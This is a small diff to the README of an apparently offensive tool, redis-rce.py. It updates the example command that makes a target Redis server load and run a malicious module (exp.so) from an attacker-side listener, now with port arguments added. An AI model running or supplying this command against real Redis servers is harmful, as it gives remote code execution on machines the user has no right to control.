@@ -28,7 +28,7 @@ optional arguments:
 
 ## example:
 ```
-python redis-rce.py -r 127.0.0.1 -L 127.0.0.1 -f exp.so
+python redis-rce.py -r 127.0.0.1 -p 6379 -L 127.0.0.1 -P 1337 -f exp.so
 ```
 ![image](https://user-images.githubusercontent.com/55566953/136344910-e2afabce-fa9d-4995-b911-cd2cb3b7dd84.png)
 
